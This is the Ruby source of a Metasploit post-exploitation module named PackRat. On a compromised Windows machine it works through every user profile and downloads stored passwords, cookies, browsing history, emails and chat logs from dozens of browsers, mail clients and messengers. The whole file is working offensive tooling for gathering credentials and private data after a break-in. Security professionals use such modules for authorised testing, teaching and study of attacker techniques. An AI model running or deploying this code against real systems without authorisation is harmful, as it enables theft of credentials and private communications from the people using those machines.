##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/user_profiles'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info( info,
    'Name'         => 'Windows Gather Application Artifacts (PackRat)',
    'Description'  => %q{
     PackRat gathers artifacts of various categories from a large number of applications.

     Artifacts include: chat logins and logs, browser logins and history and cookies,
     email logins and emails sent and received and deleted, contacts, and many others.
     These artifacts are collected from applications including:
     12 browsers, 13 chat/IM/IRC applications, 6 email clients, and 1 game.

     The use case for this post-exploitation module is to specify the types of
     artifacts you are interested in, to gather the relevant files depending on your aims.

     Please refer to the options for a full list of filter categories.
    },
    'License'      => MSF_LICENSE,
    'Author'       => [
      'Barwar Salim M',  # Leeds Beckett University student
      'Z. Cliffe Schreuders (http://z.cliffe.schreuders.org)'  # Leeds Beckett University lecturer
    ],
    'Platform'     => %w{win},
    'SessionTypes' => ['meterpreter']
    ))

    register_options(
    [
      OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database (otherwise, only download)', 'true']),
      # enumerates the options based on the artifacts that are defined below
      OptEnum.new('APPCATEGORY', [false, 'Category of applications to gather from', 'All', @@apps.map{ |x| x[:category] }.uniq.unshift('All')]),
      OptEnum.new('APPLICATION', [false, 'Specify application to gather from', 'All', @@apps.map{ |x| x[:application] }.uniq.unshift('All')]),
      OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', @@apps.map{ |x| x[:filetypes] }.uniq.unshift('All')]),
], self.class)
  end

  # this associative array defines the artifacts known to PackRat
  @@apps= [
    # Email clients
    ## IncrediMail
    {
      :application=> 'incredimail',
      :category => "emails",
      :filetypes => "email_logs",
      :path => 'LocalAppData',
      :dir => 'IM',
      :artifact=> "msg.iml",
      :description => "IncrediMail's sent and received emails"},
    ## Outlook
    {
      :application=> 'outlook',
      :category => "emails",
      :filetypes => "deleted_emails",
      :path => 'LocalAppData',
      :dir => 'Identities',
      :artifact=> "Deleted Items.dbx",
      :description => "Outlook's Deleted emails"},
    {
      :application=> 'outlook',
      :category => "emails",
      :filetypes => "draft_emails",
      :path => 'LocalAppData',
      :dir => 'Identities',
      :artifact=> "Drafts.dbx",
      :description => "Outlook's unsent emails"},
    {
      :application=> 'outlook',
      :category => "emails",
      :filetypes => "email_logs",
      :path => 'LocalAppData',
      :dir => 'Identities',
      :artifact=> "Folders.dbx",
      :description => "Outlook's Folders"},
    {
      :application=> 'outlook',
      :category => "emails",
      :filetypes => "received_emails",
      :path => 'LocalAppData',
      :dir => 'Identities',
      :artifact=> "Inbox.dbx",
      :description => "Outlook's received emails"},
    {
      :application=> 'outlook',
      :category => "emails",
      :filetypes => "email_logs",
      :path => 'LocalAppData',
      :dir => 'Identities',
      :artifact=> "Offline.dbx",
      :description => "Outlook's offline emails"},
    {
      :application=> 'outlook',
      :category => "emails",
      :filetypes => "email_logs",
      :path => 'LocalAppData',
      :dir => 'Identities',
      :artifact=> "Outbox.dbx",
      :description => "Outlook's sent emails"},
    {
      :application=> 'outlook',
      :category => "emails",
      :filetypes => "sent_emails",
      :path => 'LocalAppData',
      :dir => 'Identities',
      :artifact=> "Sent Items.dbx",
      :description => "Outlook's sent emails"},
    ## Opera Mail
    {
      :application=> 'operamail',
      :category => "emails",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => 'Opera Mail',
      :artifact=> "wand.dat",
      :description => "Opera-Mail's saved Username & Passwords"},
    {
      :application=> 'operamail',
      :category => "emails",
      :filetypes => "email_logs",
      :path => 'LocalAppData',
      :dir => 'Opera Mail',
      :artifact=> "*.mbs",
      :description => "Opera-Mail's emails"},
    ## PostBox Mail
    {
      :application=> 'postbox',
      :category => "emails",
      :filetypes => "received_emails",
      :path => 'AppData',
      :dir => 'Postbox',
      :artifact=> "INBOX",
      :description => "Postbox's sent and received emails"},
    {
      :application=> 'postbox',
      :category => "emails",
      :filetypes => "sent_emails",
      :path => 'AppData',
      :dir => 'Postbox',
      :artifact=> "Sent*",
      :description => "Postbox's sent and received emails"},
    {
      :application=> 'postbox',
      :category => "emails",
      :filetypes => "email_logs",
      :path => 'AppData',
      :dir => 'Postbox',
      :artifact=> "*.msf",
      :description => "Postbox's sent and received emails"},
    {
      :application=> 'postbox',
      :category => "emails",
      :filetypes => "email_logs",
      :path => 'AppData',
      :dir => 'Postbox',
      :artifact=> "Archive.msf",
      :description => "Postbox's sent and received emails"},
    {
      :application=> 'postbox',
      :category => "emails",
      :filetypes => "email_logs",
      :path => 'AppData',
      :dir => 'Postbox',
      :artifact=> "Bulk Mail.msf",
      :description => "Postbox's junk emails"},
    {
      :application=> 'postbox',
      :category => "emails",
      :filetypes => "draft_emails",
      :path => 'AppData',
      :dir => 'Postbox',
      :artifact=> "Draft.msf",
      :description => "Postbox's unsent emails"},
    {
      :application=> 'postbox',
      :category => "emails",
      :filetypes => "received_emails",
      :path => 'AppData',
      :dir => 'Postbox',
      :artifact=> "INBOX.msf",
      :description => "Postbox's received emails"},
    {
      :application=> 'postbox',
      :category => "emails",
      :filetypes => "sent_emails",
      :path => 'AppData',
      :dir => 'Postbox',
      :artifact=> "Sent*.msf",
      :description => "Postbox's sent emails"},
    {
      :application=> 'postbox',
      :category => "emails",
      :filetypes => "sent_emails",
      :path => 'AppData',
      :dir => 'Postbox',
      :artifact=> "Sent.msf",
      :description => "Postbox's sent emails"},
    {
      :application=> 'postbox',
      :category => "emails",
      :filetypes => "email_logs",
      :path => 'AppData',
      :dir => 'Postbox',
      :artifact=> "Templates.msf",
      :description => "Postbox's template emails"},
    {
      :application=> 'postbox',
      :category => "emails",
      :filetypes => "deleted_emails",
      :path => 'AppData',
      :dir => 'Postbox',
      :artifact=> "Trash.msf",
      :description => "Postbox's Deleted emails"},
    ## Mozilla Thunderbird Mail
    {
      :application=> 'thunderbird',
      :category => "emails",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => 'Thunderbird',
      :artifact=> "signons.sqlite",
      :description => "Thunderbird's saved Username & Passwords"},
    {
      :application=> 'thunderbird',
      :category => "emails",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => 'Thunderbird',
      :artifact=> "key3.db",
      :description => "Thunderbird's saved Username & Passwords"},
    {
      :application=> 'thunderbird',
      :category => "emails",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => 'Thunderbird',
      :artifact=> "cert8.db",
      :description => "Thunderbird's saved Username & Passwords"},
    {
      :application=> 'thunderbird',
      :category => "emails",
      :filetypes => "received_emails",
      :path => 'AppData',
      :dir => 'Thunderbird',
      :artifact=> "Inbox",
      :description => "Thunderbird's received emails"},
    {
      :application=> 'thunderbird',
      :category => "emails",
      :filetypes => "sent_emails",
      :path => 'AppData',
      :dir => 'Thunderbird',
      :artifact=> "Sent",
      :description => "Thunderbird's Send emails"},
    {
      :application=> 'thunderbird',
      :category => "emails",
      :filetypes => "deleted_emails",
      :path => 'AppData',
      :dir => 'Thunderbird',
      :artifact=> "Trash",
      :description => "Thunderbird's Deleted emails"},
    {
      :application=> 'thunderbird',
      :category => "emails",
      :filetypes => "draft_emails",
      :path => 'AppData',
      :dir => 'Thunderbird',
      :artifact=> "Drafts",
      :description => "Thunderbird's unsent emails"},
    {
      :application=> 'thunderbird',
      :category => "emails",
      :filetypes => "database",
      :path => 'AppData',
      :dir => 'Thunderbird',
      :artifact=> "global-messages-db.sqlite",
      :description => "emails info"},
    ## Windows Live Mail
    {
      :application=> 'windowlivemail',
      :category => "emails",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => 'Microsoft',
      :artifact=> "*.oeaccount",
      :description => "Windows Live Mail's saved Username & Password"},
    # Instant Messaging chats applications  x 13
    ## AIM (Aol Instant Messaging)
    {
      :application=> 'AIM',
      :category => "chats",
      :filetypes => "logins",
      :path => 'LocalAppData',
      :dir => 'AIM',
      :artifact=> "aimx.bin",
      :description => "AIM's saved Username & Passwords"},
    {
      :application=> 'AIM',
      :category => "chats",
      :filetypes => "chat_logs",
      :path => 'LocalAppData',
      :dir => 'AIM',
      :artifact=> "*.html",
      :description => "AIM's chat logs with date and times"},
    ## Digsby is multi-protocol Instant Messaging client which lets the user to comunicate with all friends from many applications of other IM chat application such as AIM, MSN, Yahoo, ICQ, Google Talk,
    {
      :application=> 'digsby',
      :category => "chats",
      :filetypes => "logins",
      :path => 'LocalAppData',
      :dir => 'Digsby',
      :artifact=> "logininfo.yaml",
      :description => "Digsby's saved Username & Passwords"},
    ## GaduGadu, popular Polish chat (Poland country)
    {
      :application=> 'gadugadu',
      :category => "chats",
      :filetypes => "chat_logs",
      :path => 'GG dysk',
      :dir => 'Galeria',
      :artifact=> "Thumbs.db",
      :description => "Saved Gadu Gadu User Profile Images in Thumbs.db file"},
    {
      :application=> 'gadugadu',
      :category => "chats",
      :filetypes => "chat_logs",
      :path => 'AppData',
      :dir => 'GG',
      :artifact=> "profile.ini",
      :description => "GaduGadu profile User information : Rename long saved artifactto in profile.ini"},
    ## ICQ chat is used for messaging, video and voice calls
    {
      :application=> 'ICQ',
      :category => "chats",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => 'ICQ',
      :artifact=> "Owner.mdb",
      :description => "ICQ's saved Username & Passwords"},
    {
      :application=> 'ICQ',
      :category => "chats",
      :filetypes => "chat_logs",
      :path => 'AppData',
      :dir => 'ICQ',
      :artifact=> "Messages.mdb",
      :description => "ICQ's chat logs"},
    ## Miranda is a multi protocol instant messaging client, protocols such as AIM (AOL Instant Messenger), Gadu-Gadu, ICQ, Tlen and others.
    {
      :application=> 'miranda',
      :category => "chats",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => 'Miranda',
      :artifact=> "Home.dat",
      :description => "Miranda's multi saved chat protocol Username, (coded Passwords"},
    ## Nimbuzz
    {
      :application=> 'nimbuzz',
      :category => "chats",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => 'nimbuzz',
      :artifact=> "nimbuzz.log",
      :description => "Username&Password - user phone number "},
    ## Pidgen Pidgin is an easy to use and free chat client used by millions. Connect to AIM, MSN, Yahoo, and others
    {
      :application=> 'pidgen',
      :category => "chats",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => '.purple',
      :artifact=> "accounts.xml",
      :description => "Pidgen's saved Username & Passwords"},
    {
      :application=> 'pidgen',
      :category => "chats",
      :filetypes => "chat_logs",
      :path => 'AppData',
      :dir => '.purple',
      :artifact=> "*.html",
      :description => "Pidgen's chat logs"},
    ## QQ International is a Chinese online communication instant messagins with 750+ million existing users.
    {
      :application=> "QQ",
      :category => "chats",
      :filetypes => "chat_logs",
      :path => 'AppData',
      :dir => "Tencent",
      :artifact=> "UserHeadTemp*",
      :description => "QQ's Profile Image"},
    ## Skype
    {
      :application=> 'skype',
      :category => "chats",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => 'Skype',
      :artifact=> "main.db",
      :description => "Skype's 's saved Username & Passwords"},
    ## Tango - Texts and videos chat for mobiles and PCs
    {
      :application=> 'tango',
      :category => "chats",
      :filetypes => "database",
      :path => 'LocalAppData',
      :dir => 'tango',
      :artifact=> "contacts.dat",
      :description => "All Contact's name "},
    {
      :application=> 'tango',
      :category => "chats",
      :filetypes => "software_version",
      :path => 'LocalAppData',
      :dir => 'tango',
      :artifact=> "install.log",
      :description => "Tango Version "},
    ## Tlen.pl is an adware licensed Polish instant messaging service. It is fully compatible with Gadu-Gadu instant messenger.
    {
      :application=> 'tlen.pl',
      :category => "chats",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => 'Tlen.pl',
      :artifact=> "Profiles.dat",
      :description => "Tlen.pl's saved Username & Passwords"},
    {
      :application=> 'tlen.pl',
      :category => "chats",
      :filetypes => "chat_logs",
      :path => 'AppData',
      :dir => 'Tlen.pl',
      :artifact=> "*.jpg",
      :description => "Tlen.pl sent Images"},
    ## Trillian multi-protocol such as  AIM, ICQ.
    {
      :application=> 'trillian',
      :category => "chats",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => 'Trillian',
      :artifact=> "accounts.ini",
      :description => "Trillian's saved Username & Passwords"},
    {
      :application=> 'trillian',
      :category => "chats",
      :filetypes => 'chat_logs',
      :path => 'AppData',
      :dir => 'Trillian',
      :artifact=> "*.log",
      :description => "Trillian logs; Open the file"},
    ## Viber - Texts and videos chat for mobiles and PCs
    {
      :application=> 'viber',
      :category => "chats",
      :filetypes => "database",
      :path => 'AppData',
      :dir => 'ViberPC',
      :artifact=> "viber.db",
      :description => "All Contact's names, numbers, sms are saved from user's mobile"},
    {
      :application=> 'viber',
      :category => "chats",
      :filetypes => "thumbs",
      :path => 'AppData',
      :dir => 'ViberPC',
      :artifact=> "Thumbs.db",
      :description => "Viber's Contact's profile images in Thumbs.db file"},
    {
      :application=> 'viber',
      :category => "chats",
      :filetypes => "images",
      :path => 'AppData',
      :dir => 'ViberPC',
      :artifact=> "*.jpg",
      :description => "Collects all images of contacts and sent recieved"},
     ## xChat  is used also for
    {
      :application=> 'xchat',
      :category => "chats",
      :filetypes => "chat_logs",
      :path => 'AppData',
      :dir => 'X-Chat 2',
      :artifact=> "*.txt",
      :description => "Collects all chatting conversations of sent and recieved"},
    # Gaming  x1
    ## Xfire is popular for gaming
    {
      :application=> 'xfire',
      :category => "gaming",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => 'Xfire',
      :artifact=> "xfireUser.ini",
      :description => "Xfire saved Username & Passwords"},
    {
      :application=> 'xfire',
      :category => "gaming",
      :filetypes => "logins",
      :path => 'AppDataLocal',
      :dir => 'Xfire',
      :artifact=> "xfireUser.ini",
      :description => "Xfire saved Username & Passwords"},
    #Web Browsers applications x 13
    ## Avant
    {
      :application=> "avant",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir =>'Avant Profiles',
      :artifact=> "forms.dat",
      :description => "Avant's saved Username & Passwords"},
    ## Comodo
    {
      :application=> "comodo",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'LocalAppData',
      :dir =>'COMODO',
      :artifact=> "Login Data",
      :description => "Comodo's saved Username & Passwords"},
    {
      :application=> "comodo",
      :category => "browsers",
      :filetypes => "cookies",
      :path => 'LocalAppData',
      :dir =>'COMODO',
      :artifact=> "Cookies",
      :description => "Cookies"},
    {
      :application=> "comodo",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'LocalAppData',
      :dir =>'COMODO',
      :artifact=> "History",
      :description => "Comodo's History"},
    {
      :application=> "comodo",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'LocalAppData',
      :dir =>'COMODO',
      :artifact=> "Visited Links",
      :description => "Comodo's History"},
    ## CoolNovo
    {
      :application=> "coolnovo",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'LocalAppData',
      :dir =>'MapleStudio',
      :artifact=> "Login Data",
      :description => "Comodo's saved Username & Passwords"},
    ## Chrome
    {
      :application=> "chrome",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'LocalAppData',
      :dir => "Google",
      :artifact=> "Login Data",
      :description => "Chrome's saved Username & Passwords"},
    {
      :application=> "chrome",
      :category => "browsers",
      :filetypes => "cookies",
      :path => 'LocalAppData',
      :dir => "Google",
      :artifact=> "Cookies",
      :description => "Chrome Cookies"},
    {
      :application=> "chrome",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'LocalAppData',
      :dir => "Google",
      :artifact=> "History",
      :description => "Chrome History"},
    ## FireFox
    {
      :application=> "firefox",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => "Mozilla",
      :artifact=> "logins.json",
      :description => "Firefox's saved Username & Passwords "},
    {
      :application=> "firefox",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => "Mozilla",
      :artifact=> "cert8.db",
      :description => "Firefox's saved Username & Passwords"},
    {
      :application=> "firefox",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => "Mozilla",
      :artifact=> "key3.db",
      :description => "Firefox's saved Username & Passwords"},
    {
      :application=> "firefox",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'AppData',
      :dir => "Mozilla",
      :artifact=> "places.sqlite",
      :description => "FireFox History"},
    {
      :application=> "firefox",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'AppData',
      :dir =>'Mozilla',
      :artifact=> "formhistory.sqlite",
      :description => "FireFox's saved Username using sqlite tool"},
    {
      :application=> "firefox",
      :category => "browsers",
      :filetypes => "cookies",
      :path => 'AppData',
      :dir => "Mozilla",
      :artifact=> "cookies.sqlite",
      :description => "Firefox's cookies"},
    ## Flock
    {
      :application=> "flock",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir =>'Flock',
      :artifact=> "formhistory.sqlite",
      :description => "Flock's saved Username"},
    {
      :application=> "flock",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'AppData',
      :dir =>'Flock',
      :artifact=> "downloads.sqlite",
      :description => "Flock's downloaded files"},
    {
      :application=> "flock",
      :category => "browsers",
      :filetypes => "cookies",
      :path => 'AppData',
      :dir =>'Flock',
      :artifact=> "cookies.sqlite",
      :description => "Flock's Cookies file"},
    ## IE
    {
      :application=> "IE",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'LocalSettings',
      :dir =>'History',
      :artifact=> "index.dat",
      :description => "IE's History"},
    ## K-Meleon
    {
      :application=> "k-meleon",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => "K-Meleon",
      :artifact=> "signons.sqlite",
      :description => "K-Meleon's saved Username & Passwords"},
    {
      :application=> "k-meleon",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => "K-Meleon",
      :artifact=> "key3.db",
      :description => "K-Meleon's saved Username & Passwords"},
    {
      :application=> "k-meleon",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => "K-Meleon",
      :artifact=> "cert8.db",
      :description => "K-Meleon's saved Username & Passwords"},
    {
      :application=> "k-meleon",
      :category => "browsers",
      :filetypes => "cookies",
      :path => 'AppData',
      :dir => "K-Meleon",
      :artifact=> "cookies.sqlite",
      :description => "K-Meleon's Cookies"},
    {
      :application=> "k-meleon",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'AppData',
      :dir => "K-Meleon",
      :artifact=> "formhistory.sqlite",
      :description => "K-Meleon's Visited websites history"},
    {
      :application=> "k-meleon",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'AppData',
      :dir => "K-Meleon",
      :artifact=> "places.sqlite",
      :description => "K-Meleon's Visited websites history"},
    ## Maxthon
    {
      :application=> "maxthon",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => "Maxthon3",
      :artifact=> "MagicFill2.dat",
      :description => "Maxthon's saved Username & Passwords"},
    ## Opera
    {
      :application=> "opera",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => "Opera Software",
      :artifact=> "Login Data",
      :description => "Opera's saved Username & Passwords"},
    {
      :application=> "opera",
      :category => "browsers",
      :filetypes => "cookies",
      :path => 'AppData',
      :dir => "Opera Software",
      :artifact=> "Cookies",
      :description => "Opera Cookies"},
    {
      :application=> "opera",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'AppData',
      :dir => "Opera Software",
      :artifact=> "Visited Links",
      :description => "Opera Visited Links"},
    ## SRware
    {
      :application=> "srware",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'LocalAppData',
      :dir => "Chromium",
      :artifact=> "Login Data",
      :description => "SRware's saved Username & Passwords"},
    {
      :application=> "srware",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'LocalAppData',
      :dir => "Chromium",
      :artifact=> "Cookies",
      :description => "SRware's Cookies"},
    {
      :application=> "srware",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'LocalAppData',
      :dir => "Chromium",
      :artifact=> "History",
      :description => "SRware's Visited websites history"},
    ## Safari
    {
      :application=> "safari",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => "Apple Computer",
      :artifact=> "keychain.plist",
      :description => "Safari History"},
    ## SeaMonkey
    {
      :application=> "seamonkey",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => "Mozilla",
      :artifact=> "logins.json",
      :description => "SeaMonkey's saved Username & Passwords"},
    {
      :application=> "seamonkey",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => "Mozilla",
      :artifact=> "cert8.db",
      :description => "SeaMonkey's saved Username & Passwords"},
    {
      :application=> "seamonkey",
      :category => "browsers",
      :filetypes => "logins",
      :path => 'AppData',
      :dir => "Mozilla",
      :artifact=> "key3.db",
      :description => "SeaMonkey's saved Username & Passwords"},
    {
      :application=> "seamonkey",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'AppData',
      :dir =>'Mozilla',
      :artifact=> "formhistory.sqlite",
      :description => "SeaMonkey's saved Username"},
    {
      :application=> "seamonkey",
      :category => "browsers",
      :filetypes => "web_history",
      :path => 'AppData',
      :dir => "Mozilla",
      :artifact=> "places.sqlite",
      :description => "SeaMonkey History"},
    {
      :application=> "seamonkey",
      :category => "browsers",
      :filetypes => "cookies",
      :path => 'AppData',
      :dir => "Mozilla",
      :artifact=> "cookies.sqlite",
      :description => "SeaMonkey's cookies"}
  ]
  @@success_count = 0
  @@try_count = 0

  def run
    print_line("\nPackRat is searching and gathering...\n")
    print_line("Filtering based on these selections: \n")
    print_line("\tAPPCATEGORY: #{datastore['APPCATEGORY'].capitalize}, APPLICATION: #{datastore['APPLICATION'].capitalize}, ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}\n")

    @@success_count = 0
    @@try_count = 0
    #used to grab files for each user on the remote host.
    grab_user_profiles.each do |userprofile|
      @@apps.each { |f| downloading(userprofile, f) }
    end
    print_status("Downloaded #{@@success_count} artifact(s), attempted #{@@try_count}.\n")
  end

  # Check to see if the artifact exists on the remote system.
  def location(profile, opts={})
    path = profile[opts[:path]]
    dir = opts[:dir]
    dirs = session.fs.dir.foreach(path).collect
    return dirs.include? dir
    end

  # Download file from the remote system, if it exists.
  def downloading(profile, opts={})
    cat = opts[:category]
    app = opts[:application]
    artifact = opts[:artifact]
    ft = opts[:filetypes]
    dir = opts[:dir]
    path = opts[:path]

    # filter based on options
    if (cat != datastore['APPCATEGORY'] && datastore['APPCATEGORY'] != 'All') || (app != datastore['APPLICATION'] && datastore['APPLICATION'] != 'All') || (ft != datastore['ARTIFACTS'] && datastore['ARTIFACTS'] != 'All')
      # doesn't match search criteria, skip this artifact
      return false
    end

    @@try_count += 1
    print_status("Searching for #{app.capitalize}'s #{artifact.capitalize} files in #{profile['UserName']}'s user directory...")
    # check if file exists in user's directory on the remote computer.
    if location(profile, opts)
      print_status("#{app.capitalize}'s #{artifact.capitalize} file found")
    else
      print_error("#{app.capitalize}'s #{artifact.capitalize} not found in #{profile['UserName']}'s user directory\n")
      # skip non-existing file
      return false
    end

    # read from app array above
    artifact = opts[:artifact]
    dir = opts[:dir]
    path = opts[:path]
    description = opts[:description]
    file_dir = "#{profile[path]}\\#{dir}"
    file = session.fs.file.search(file_dir, "#{artifact}", true)
    # additional check for file
    return false unless file

    file.each do |db|
      # split path for each directory
      guid = db['path'].split('\\')
      local_loc = "#{guid.last}#{artifact}"
      saving_path = store_loot("#{app}#{artifact}", "", session, "", local_loc)
      maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
      print_status("Downloading #{maindb}")
      session.fs.file.download_file(saving_path, maindb)
      print_status("#{app.capitalize} #{artifact.capitalize} downloaded (#{description})")
      print_good("File saved to #{saving_path}\n")
      @@success_count += 1
    end
    return true
  end
end
